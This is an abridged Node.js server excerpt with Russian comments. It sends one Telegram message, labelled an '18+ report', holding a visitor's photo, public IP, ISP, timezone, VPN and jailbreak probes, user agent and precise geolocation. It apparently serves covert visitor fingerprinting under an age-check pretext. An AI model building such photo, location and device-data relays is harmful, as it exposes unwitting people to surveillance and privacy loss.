// === server/index.js (единое сообщение в ТГ: фото + короткий цветной caption) ===
...
// (оставил, если вдруг пригодится; фронт больше не вызывает это)
...
app.get('/api/client-ip', (req, res) => {
  try {
    ...
    const isp = req.headers['x-isp'] || null; // можно прокидывать с реверс-прокси
...
// === API: tg-relay (не используется, но оставлен совместимости ради)
...
// ==== API: report — ОДНО сообщение (фото + короткий caption с цветом) ====
app.post('/api/report', async (req, res) => {
  try {
    ...
    // --- severity badge
    const score = Number(device_check?.score ?? 0);
    const badge = score >= 80 ? '🟢' : score >= 60 ? '🟡' : '🔴';

    // --- VPN/JB короткие бейджи
    const vpn = client_profile?.vpnProxy || {};
    const vpnBadge =
      vpn.label === 'likely'   ? '🔴 VPN likely' :
      vpn.label === 'possible' ? '🟡 VPN possible' : '🟢 VPN unlikely';

    const jbLikely = !!device_check?.details?.jailbreakProbe?.likelyJailbroken;
    const jbHit    = device_check?.details?.jailbreakProbe?.hit?.scheme || null;
    const jbBadge  = jbLikely ? `🔴 JB (${jbHit || 'hit'})` : '🟢 JB no';

    // --- сеть
    const pub = client_profile?.publicIp || {};
    const tz  = client_profile?.timezone || '-';

    // --- caption (ужато под лимит ~1024)
    const capLines = [
      `<b>${badge} Отчёт 18+</b>  score=<code>${isFinite(score) ? score : '-'}</code>`,
      `Code: <code>${escapeHTML(String(code).toUpperCase())}</code>`,
      `IP: <code>${escapeHTML(pub.ip || '-')}</code> · CC: <code>${escapeHTML(pub.country || '-')}</code> · ISP: <code>${escapeHTML(pub.isp || pub.org || '-')}</code>`,
      `TZ: <code>${escapeHTML(tz)}</code> · ${vpnBadge} · ${jbBadge}`,
      `UA: <code>${escapeHTML((userAgent || '').slice(0, 220))}</code>`,
      `iOS-like: <code>${escapeHTML(iosVersion ?? '')}</code> · Safari: <code>${escapeHTML(String(isSafari))}</code>`,
      geo ? `Geo: <code>${escapeHTML(`${geo.lat}, ${geo.lon} ±${geo.acc}m`)}</code>` : null,
      note ? `Note: <code>${escapeHTML(note)}</code>` : null
    ].filter(Boolean);

    // Telegram caption жёстко ограничен — чуть подрежем, если что
    ...
    // Важно: ничего больше не отправляем — одно сообщение ✅
